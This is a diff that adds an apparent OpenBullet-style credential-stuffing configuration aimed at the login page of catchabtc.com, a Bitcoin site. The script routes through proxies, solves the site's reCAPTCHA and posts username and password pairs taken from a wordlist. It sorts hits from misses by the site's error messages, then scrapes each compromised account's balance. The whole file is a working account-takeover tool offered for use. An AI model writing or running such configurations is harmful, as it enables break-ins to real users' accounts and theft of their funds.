@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "catchabtc",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-20T09:02:19.0224459-07:00",
+  "AdditionalInfo": "",
+  "Author": "Mrcl1450",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+RECAPTCHA "https://www.catchabtc.com/login" "6LeWKR0UAAAAAE87WrDfieVIyZ9o7aq9E49S-jM0" -> VAR "captcha" 
+
+REQUEST POST "https://www.catchabtc.com/login" AutoRedirect=FALSE 
+  CONTENT "sponsor=Daniel&username=<USER>&password=<PASS>&g-recaptcha-response=<captcha>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.catchabtc.com" 
+  HEADER "Referer: https://www.catchabtc.com/login" 
+  HEADER "Origin: https://www.catchabtc.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Redirecting" 
+  KEYCHAIN Failure OR 
+    KEY "Username does not exist" 
+    KEY "Invalid password" 
+
+REQUEST GET "https://www.catchabtc.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.catchabtc.com" 
+  HEADER "Referer: https://www.catchabtc.com/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Start" 
+  KEYCHAIN Failure OR 
+    KEY "Register" 
+
+PARSE "<SOURCE>" LR "<span class=\"balance\">" "</span>" -> CAP "Bits" 
+
